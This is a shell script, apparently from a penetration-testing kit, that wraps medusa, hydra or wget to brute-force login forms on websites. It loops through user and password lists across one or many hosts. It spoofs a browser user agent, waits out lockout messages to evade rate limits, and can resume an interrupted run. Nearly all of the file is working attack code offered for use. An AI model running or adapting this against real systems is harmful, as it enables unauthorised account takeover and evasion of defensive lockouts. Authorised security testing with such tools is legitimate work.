#!/bin/sh

ShowUsage() {
	echo ""
	echo "Usage: $0 [--use-get] [--webpage=<webpage>] [--deny-msg=<deny msg>] [--extraparams=<extraparams>] [--hostfile=<file> | --host=<host>] [--userfile=<userfile> | --userid=<user>] <--passwordfile=<passwordfile>"
	echo "Brute force medusa or hydra wrapper for HTTP forms-based authentication"
	echo ""
	echo "Required:"
	echo "--webpage=<webpage>   Form page to attack. Ex: /myapp/login.aspx"
	echo "--userparam=<user param> This is the posted field name for the username.  e.g. CT_USERNAME"
	echo "--passparam=<pass param> This is the posted field name for the password.  e.g. CT_PASSWORD"
	echo "--deny-msg=<deny msg> What to key off of in the returned page to indicate failure."
	echo "                      If using wget, the deny message can start with '-v ' to invert the match (deny becomes success)"
	echo "--host=<host>]        IP address of single system to attack"
	echo "--passwordfile=<passwordfile>  Password file to use"
	echo ""
	echo "Optional:"
	echo "--use-ssl"
	echo "--hostfile=<file>     File with list of IP's to attack instead of a single host"
	echo "--use-get             Send request using GET rather than POST (default)"
	echo "--extraparams=<extraparams> These are additional values that need to be posted."
	echo "                            List should be in URL notation: SUBMIT=TRUE&PARM1=Val%20ue&PARM2=TRUE"
	echo "                            Note: Use webscarab or Paros to intercept a post and identify parameters."
	echo "--use-hydra           Try hydra rather than the default medusa"
	echo "--use-wget	    Use wget rather then medusa or hydra.  Much slower but some sites are problematic."
	echo "                      Note with wget, deny-msg may be a grep regular expression.  A wait paramater can "
	echo "                      also be used if an IP block message is also different."
	echo "--wget-wait=<pattern> Provide a grep regular expression to identify when a login limit has been reached"
	echo "                      and requests should wait until this message is no longer received."
	echo "--wget-startat=<number> If a scan was stopped, the scan can be restarted at the specified password number"
	echo "--help                Usage information."
	echo ""
	echo "One of the following is also required"
	echo "--userid=<user>       Single user id to try"
	echo "--userfile=<userfile> File with list of usernames to attempt"
}

if [ $# -eq 0 ]; then
	ShowUsage
	exit 1
fi

WGETSTARTAT=1
WGETWAIT=""
USESSL=""
HOSTFILE=""
HOST=""
PASSWORDFILE=""
USERNAME=""
USERFILE=""
USERPARAM=""
PASSPARAM=""
EXTRAPARAMS=""
HASEXTRAPARAMS=0
WEBPAGE=""
DENYMSG=""
METHOD="post"
USEHYDRA=0
USEWGET=0

FIREFOXUSERAGENTSTRING="Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:23.0) Gecko/20131011 Firefox/23.0"
IPADUSERAGENTSTRING="Mozilla/5.0 (iPad; U; CPU iPad OS 5_0_1 like Mac OS X; en-us) AppleWebKit/535.1+ (KHTML like Gecko) Version/7.2.0.0 Safari/6533.18.5"
#USERAGENTSTRING="$IPADUSERAGENTSTRING"
USERAGENTSTRING="$FIREFOXUSERAGENTSTRING"

# $* had an issue with parameters with spaces, even when quoted.
#for i in $*
#for i in `seq 1 $#`
for i in "$@"
do
#	eval REALPARM=\$$i

	case $i in
	--use-wget)
		USEWGET=1
	;;
	--use-hydra)
		USEHYDRA=1
	;;
	--use-ssl)
		USESSL="-s -n 443"
	;;
	--use-get)
		METHOD="get"
	;;
	--wget-startat=*)
		WGETSTARTAT=`echo $i | sed 's/[-a-zA-Z0-9]*=//'| sed "s|\"||g"`
	;;
	--wget-wait=*)
		WGETWAIT=`echo "$i" | sed 's/[-a-zA-Z0-9]*=//'| sed "s|\"||g"`
	;;
	--webpage=*)
		WEBPAGE=`echo "$i" | sed 's/[-a-zA-Z0-9]*=//'| sed "s|\"||g"`
	;;
	--userparam=*)
		USERPARAM=`echo "$i" | sed 's/[-a-zA-Z0-9]*=//' | sed "s|\"||g"`
	;;
	--passparam=*)
		PASSPARAM=`echo "$i" | sed 's/[-a-zA-Z0-9]*=//'| sed "s|\"||g"`
	;;
	--extraparams=*)
		EXTRAPARAMS=`echo "$i" | sed 's/\-\-extraparams=//'| sed "s|\"||g" | sed "s|'||g"`
		HASEXTRAPARAMS=1
	;;
	--deny-msg=*)
		DENYMSG=`echo "$i" | sed 's/[-a-zA-Z0-9]*=//'| sed "s|\"||g"`
	;;
	--host=*)
		HOST=`echo "$i" | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--hostfile=*)
		HOSTFILE=`echo "$i" | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--passwordfile=*)
		PASSWORDFILE=`echo "$i" | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--userid=*)
		USERNAME=`echo "$i" | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--userfile=*)
		USERFILE=`echo "$i" | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--help)
		ShowUsage
		exit 1
	;;
	*)
		echo "Unknown parameter: $i"
		echo ""

		ShowUsage
		exit 1
	;;
	esac
done

# Adjust some parameters:
if [ $USEHYDRA -eq 1 -a ${#USESSL} -gt 0 ]; then
	USESSL="-S -s 443"
fi

# Sanity check...
if [ ${#HOST} -eq 0 -a ${#HOSTFILE} -eq 0 ]; then
	echo "ERROR: Please specify either a host or a host file."
	exit 2
fi

if [ ${#WEBPAGE} -eq 0 ]; then
	echo "ERROR: Please specify a page on the target server to use."
	exit 2
fi

if [ ${#DENYMSG} -eq 0 ]; then
	echo "ERROR: Please specify a deny message to identify a failed login."
	exit 2
fi

if [ ${#USERPARAM} -eq 0 ]; then
	echo "ERROR: Please specify a username parameter for the page."
	exit 2
fi

if [ ${#PASSPARAM} -eq 0 ]; then
	echo "ERROR: Please specify a a username parameter for the page."
	exit 2
fi

if [ ${#USERNAME} -eq 0 -a ${#USERFILE} -eq 0 ]; then
	echo "ERROR: Please specify either a user name or a user name file."
	exit 2
fi

if [ ${#PASSWORDFILE} -eq 0 ]; then
	echo "ERROR: Please specify a password file."
	exit 2
fi

if [ ! -e $PASSWORDFILE ]; then
	echo "ERROR: file $PASSWORDFILE could not be found."
	exit 3
fi

# Okay, now we're ready to go.

if [ ${#USERFILE} -gt 0 ]; then
	if [ $USEHYDRA -eq 0 ]; then
		TOOLUSERPARAM="-U $USERFILE"
	else
		TOOLUSERPARAM="-L $USERFILE"
	fi
else
	if [ $USEHYDRA -eq 0 ]; then
		TOOLUSERPARAM="-u $USERNAME"
	else
		TOOLUSERPARAM="-l $USERNAME"
	fi
fi

# Medusa web form
echo "Running tests..."
# -F = stop after finding combo
# -e ns = try blank and name

if [ ${#HOSTFILE} -gt 0 ]; then
	HOSTLIST=`cat $HOSTFILE | grep -v "^$" | grep -v "^#"`
else
	HOSTLIST=$HOST
fi

NUMHOSTS=`echo "$HOSTLIST" | wc -l`

if [ $USEHYDRA -eq 1 ]; then
	SERVICENAME=`echo "http-$METHOD-form"`
fi

if [ $USEWGET -eq 1 ]; then
	TOOLSUSED="WGET"
else
	if [ $USEHYDRA -eq 0 ]; then
		TOOLUSED="medusa"
	else
		TOOLUSED="hydra"
	fi
fi

IFS_BAK=$IFS
IFS="
"

for CURHOST in $HOSTLIST
do
	OUTPUTFILE=`echo "$CURHOST.crack.web-form.txt"`
	DATESTR=`date`

	if [ $USEHYDRA -eq 0 ]; then
		HOSTPARAM="-h $CURHOST"
	else
		HOSTPARAM=$CURHOST
	fi

	if [ $NUMHOSTS -gt 1 ]; then
		# Parallelizing scans
		echo "[$DATESTR] Spawning web form brute force for $CURHOST using $TOOLUSED with $PASSWORDFILE [output to $OUTPUTFILE]..."
		echo "[$DATESTR] Spawning web form brute force for $CURHOST using $TOOLUSED with $PASSWORDFILE..." > $OUTPUTFILE

		if [ $HASEXTRAPARAMS -eq 0 ]; then
			if [ $USEHYDRA -eq 0 ]; then
				medusa $HOSTPARAM $TOOLUSERPARAM -P $PASSWORDFILE -M web-form -e ns -f $USESSL -m FORM:"$WEBPAGE" -m DENY-SIGNAL:"$DENYMSG" -m FORM-DATA:"$METHOD?$USERPARAM=&$PASSPARAM=" >> $OUTPUTFILE &
			else
				hydra $TOOLUSERPARAM -P $PASSWORDFILE -e ns -f $USESSL $HOSTPARAM $SERVICENAME $WEBPAGE:$USERPARAM=^USER^&$PASSPARAM=^PASS^:$DENYMSG  -o $OUTPUTFILE &
			fi
		else
			if [ $USEHYDRA -eq 0 ]; then
				medusa $HOSTPARAM $TOOLUSERPARAM -P $PASSWORDFILE -M web-form -e ns -f $USESSL -m FORM:"$WEBPAGE" -m DENY-SIGNAL:"$DENYMSG" -m FORM-DATA:"$METHOD?$USERPARAM=&$PASSPARAM=&$EXTRAPARAMS" >> $OUTPUTFILE &
			else
				hydra $TOOLUSERPARAM -P $PASSWORDFILE -e ns -f $USESSL $HOSTPARAM $SERVICENAME "$WEBPAGE:$USERPARAM=^USER^&$PASSPARAM=^PASS^&$EXTRAPARAMS:$DENYMSG"  -o $OUTPUTFILE &
			fi
		fi
	else
		# Run single
		echo "[$DATESTR] Running web form brute force for $CURHOST using $TOOLUSED with $PASSWORDFILE [output to $OUTPUTFILE]..."
		echo "[$DATESTR] Running web form brute force for $CURHOST using $TOOLUSED with $PASSWORDFILE..." > $OUTPUTFILE

		if [ $USEWGET -eq 0 ]; then
			if [ $HASEXTRAPARAMS -eq 0 ]; then
				if [ $USEHYDRA -eq 0 ]; then
					echo "running:"
					echo "medusa $HOSTPARAM $TOOLUSERPARAM -P $PASSWORDFILE -M web-form -f $USESSL -m FORM:\"$WEBPAGE\" -m DENY-SIGNAL:\"$DENYMSG\" -m FORM-DATA:\"$METHOD?$USERPARAM=&$PASSPARAM=\" >> $OUTPUTFILE"
					medusa $HOSTPARAM $TOOLUSERPARAM -P $PASSWORDFILE -M web-form -f $USESSL -m USER-AGENT:"$USERAGENTSTRING" -m FORM:"$WEBPAGE" -m DENY-SIGNAL:"$DENYMSG" -m FORM-DATA:"$METHOD?$USERPARAM=&$PASSPARAM=" >> $OUTPUTFILE
				else
					hydra $TOOLUSERPARAM -P $PASSWORDFILE -e ns -f $USESSL -o $OUTPUTFILE $HOSTPARAM $SERVICENAME "$WEBPAGE:$USERPARAM=^USER^&$PASSPARAM=^PASS^:$DENYMSG"
				fi
			else
				if [ $USEHYDRA -eq 0 ]; then
					echo "running:"
					echo "medusa $HOSTPARAM $TOOLUSERPARAM -P $PASSWORDFILE -M web-form -f $USESSL -m FORM:\"$WEBPAGE\" -m DENY-SIGNAL:\"$DENYMSG\" -m FORM-DATA:\"$METHOD?$USERPARAM=&$PASSPARAM=&$EXTRAPARAMS\" >> $OUTPUTFILE"
					medusa $HOSTPARAM $TOOLUSERPARAM -P $PASSWORDFILE -M web-form -f $USESSL -m USER-AGENT:"$USERAGENTSTRING" -m FORM:"$WEBPAGE" -m DENY-SIGNAL:"$DENYMSG" -m FORM-DATA:"$METHOD?$USERPARAM=&$PASSPARAM=&$EXTRAPARAMS" >> $OUTPUTFILE
				else
					echo "Running: hydra $TOOLUSERPARAM -P $PASSWORDFILE -e ns -f $USESSL $HOSTPARAM $SERVICENAME \"$WEBPAGE:$USERPARAM=^USER^&$PASSPARAM=^PASS^&$EXTRAPARAMS:$DENYMSG\""
					hydra $TOOLUSERPARAM -P $PASSWORDFILE -e ns -f $USESSL -o $OUTPUTFILE $HOSTPARAM $SERVICENAME "$WEBPAGE:$USERPARAM=^USER^&$PASSPARAM=^PASS^&$EXTRAPARAMS:$DENYMSG"
				fi
			fi
		else
			if [ ${#USESSL} -gt 0 ]; then
				REQUESTTYPE="https"
			else
				REQUESTTYPE="http"
			fi

			if [ ${#USERFILE} -gt 0 ]; then
				USERLIST=`cat $USERFILE`
			else
				USERLIST=$USERNAME
			fi

			PASSWORDS=`cat $PASSWORDFILE`

			for CURUSER in $USERLIST
			do
				echo "Checking user $CURUSER..."

				rm -rf $CURUSER.tmp
				rm -rf $CURUSER.wait

				CURPWDCOUNT=99
				TOTALPWDS=`cat $PASSWORDFILE | wc -l`
				CURRENTPWD=0

				for CURPASSWORD in $PASSWORDS
				do
					if [ -e $CURUSER.tmp ]; then
						# Found user.  Exit.
						IFS=$IFS_BAK

						exit 0
					fi

					if [ -e $CURUSER.wait ]; then
						echo "[`date`] Found wait message [$CURRENTPWD / $TOTALPWDS].  Sleeping 5 minutes..."
						sleep 5m
						rm -rf $CURUSER.wait
					fi

					CURRENTPWD=$(( CURRENTPWD + 1 ))

					if [ $CURRENTPWD -ge $WGETSTARTAT ]; then
						if [ $HASEXTRAPARAMS -eq 0 ]; then
							PARAMLIST="$USERPARAM=$CURUSER&$PASSPARAM=$CURPASSWORD"
						else
							PARAMLIST="$USERPARAM=$CURUSER&$PASSPARAM=$CURPASSWORD&$EXTRAPARAMS"
						fi

						NUMREQUESTS=`ps -A | grep -i "wget" | wc -l`

						while [ $NUMREQUESTS -gt 20 ]; do
							sleep 0.5s

							NUMREQUESTS=`ps -A | grep -i "wget" | wc -l`
						done

						CURPWDCOUNT=$(( CURPWDCOUNT + 1 ))

						if [ $CURPWDCOUNT -ge 100 ]; then
							echo "[$CURRENTPWD / $TOTALPWDS] $CURPASSWORD"
							CURPWDCOUNT=0
						fi

						FULLURL=`echo "$REQUESTTYPE://$CURHOST$WEBPAGE"`
						crack.http-form.spawnwget.sh "$PARAMLIST" "$FULLURL" "$DENYMSG" "$CURUSER" $CURPASSWORD $OUTPUTFILE &
					fi
				done
			done
		fi

		DATESTR=`date`
		echo "[$DATESTR] Scan completed.  See $OUTPUTFILE for results."
		echo "[$DATESTR] Scan completed." >> $OUTPUTFILE
	fi
done

IFS=$IFS_BAK

